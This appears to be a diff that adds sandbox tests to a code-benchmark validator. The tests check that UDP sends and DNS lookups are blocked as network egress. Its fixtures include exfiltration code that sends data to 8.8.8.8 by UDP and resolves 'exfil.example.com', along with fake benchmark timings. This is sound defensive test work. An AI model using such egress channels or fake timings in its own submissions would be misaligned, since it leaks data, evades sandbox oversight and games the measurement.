@@ -187,6 +187,48 @@ def test_network_egress_is_blocked() -> None:
     assert any("network egress blocked" in line for line in result.errors)
 
 
+_UDP_CODE = '''
+import socket
+
+
+def sum_of_divisors(n: int) -> int:
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.sendto(b"leak", ("8.8.8.8", 53))  # UDP needs no connect() — L13 gap
+    return n
+
+
+def benchmark(n: int = 10_000, repetitions: int = 5) -> float:
+    return 1e-9
+'''
+
+_DNS_CODE = '''
+import socket
+
+
+def sum_of_divisors(n: int) -> int:
+    socket.getaddrinfo("exfil.example.com", 80)  # DNS is egress too — L13 gap
+    return n
+
+
+def benchmark(n: int = 10_000, repetitions: int = 5) -> float:
+    return 1e-9
+'''
+
+
+def test_udp_egress_is_blocked() -> None:
+    # L13: UDP sendto (no connect) must be blocked by the soft sandbox too.
+    result = gauntlet.validate(_UDP_CODE, _BASELINE)
+    assert not result.passed
+    assert any("network egress blocked" in line for line in result.errors)
+
+
+def test_dns_resolution_is_blocked() -> None:
+    # L13: getaddrinfo (DNS) is egress and a data-exfil channel — also blocked.
+    result = gauntlet.validate(_DNS_CODE, _BASELINE)
+    assert not result.passed
+    assert any("network egress blocked" in line for line in result.errors)
+
+
 def test_mypy_failure_fails() -> None:
     bad_typed = "def sum_of_divisors(n): return n\ndef benchmark(n=1,repetitions=1): return 0.0\n"
     result = gauntlet.validate(bad_typed, 1.0)
